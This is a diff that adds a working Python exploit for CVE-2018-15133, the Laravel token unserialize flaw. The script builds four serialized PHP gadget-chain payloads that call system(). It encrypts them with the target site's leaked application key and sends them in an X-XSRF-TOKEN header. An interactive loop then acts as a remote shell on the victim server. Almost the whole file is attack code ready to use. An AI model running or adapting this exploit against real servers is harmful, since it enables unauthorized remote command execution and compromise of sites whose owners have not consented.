@@ -1,0 +1,88 @@
+#! /usr/bin/env python3
+# 
+# This code exploit the CVE-2018-15133 and it's based on CVE's author PoC and MSF exploit.
+#
+# kozmic's PoC in PHP: https://github.com/kozmic/laravel-poc-CVE-2018-15133
+# Metasploit exploit in Ruby: https://www.exploit-db.com/exploits/47129
+# Bug fixed by Laravel: https://github.com/laravel/framework/pull/25121/commits/d84cf988ed5d4661a4bf1fdcb08f5073835083a0
+#
+# More reference: 
+# https://vulners.com/metasploit/MSF:EXPLOIT/UNIX/HTTP/LARAVEL_TOKEN_UNSERIALIZE_EXEC
+# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15133
+
+from rich.console import Console
+from rich.table import Table
+from Crypto import Random
+from Crypto.Cipher import AES
+from hashlib import sha256
+from Crypto.Util.Padding import pad
+import hmac
+import base64
+import json
+import argparse
+import requests
+from signal import signal, SIGINT
+from sys import exit
+
+console = Console()
+
+def generate_payload(cmd, key, method=1):
+    # Porting phpgcc thing for Laravel RCE php objects - code mostly borrowed from Metasploit's exploit
+    if method == 1: # Laravel RCE1
+        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
+    elif method == 2: # Laravel RCE2
+        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:28:"Illuminate\\Events\\Dispatcher":1:{s:12:"' + "\x00" + '*' + "\x00" + 'listeners";a:1:{s:' + str(len(cmd)) + ':"' + cmd + '";a:1:{i:0;s:6:"system";}}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
+    elif method == 3: # Laravel RCE3
+        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:39:"Illuminate\\Notifications\\ChannelManager":3:{s:6:"' + "\x00" + '*' + "\x00" + 'app";s:' + str(len(cmd)) + ':"' + cmd + '";s:17:"' + "\x00" + '*' + "\x00" + 'defaultChannel";s:1:"x";s:17:"' + "\x00" + '*' + "\x00" + 'customCreators";a:1:{s:1:"x";s:6:"system";}}}'
+    else: # Laravel RCE4
+        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:31:"Illuminate\\Validation\\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
+    value = base64.b64encode(payload_decoded.encode()).decode('utf-8')
+    key = base64.b64decode(key)
+    return encrypt(value, key)
+
+def encrypt(text, key):
+    cipher = AES.new(key,AES.MODE_CBC)
+    value = cipher.encrypt(pad(base64.b64decode(text), AES.block_size))
+    payload = base64.b64encode(value)
+    iv_base64 = base64.b64encode(cipher.iv)
+    hashed_mac = hmac.new(key, iv_base64 + payload, sha256).hexdigest()
+    iv_base64 = iv_base64.decode('utf-8')
+    payload = payload.decode('utf-8')
+    data = { 'iv': iv_base64, 'value': payload, 'mac': hashed_mac}
+    json_data = json.dumps(data) 
+    payload_encoded = base64.b64encode(json_data.encode()).decode('utf-8')
+    return payload_encoded
+
+def extractResponse(resp):
+    return resp.split('<!DOCTYPE html>')[0] # Ugly but it works, not as good as regex
+
+def key_handler(signal_received, frame):
+    print('Alrighty. Bye!')
+    exit(0)
+
+def exploit(url, api_key, cmd, method=1):
+    payload = generate_payload(cmd, api_key, method)
+    return requests.post(url,headers={'X-XSRF-TOKEN': payload})
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('URL', help="Lararel website URL to attack")
+    parser.add_argument('API_KEY', help="Laravel website API_KEY encoded in base64")
+    parser.add_argument('-c','--command', default='uname -a', help="Command to execute in the vulnerable website, if not specfied will send 'uname -a'")
+    parser.add_argument('-m','--method', type=int, choices=[1,2,3,4], default=1, help="Indicates the unserialized payload version to use: 1 = Laravel RCE1 (default), 2 = Laravel RCE2, 3 = Laravel RCE3, 4 = Laravel RCE4")
+    parser.add_argument('-i', '--interactive', action="store_true", help="Execute commands interactively, it would mimic a tty")
+    args = parser.parse_args()
+    
+    resp = exploit(args.URL, args.API_KEY, args.command, args.method)
+    console.print("\n" + extractResponse(resp.text))
+
+    if args.interactive:
+        signal(SIGINT, key_handler)
+        console.print('[bold yellow] Running in interactive mode. Press CTRL+C to exit.')
+        while True:
+            cmd = input('$ ')
+            if len(cmd) == 0: continue
+            resp = exploit(args.URL, args.API_KEY, cmd, args.method)
+            console.print(extractResponse(resp.text))
+
+main()
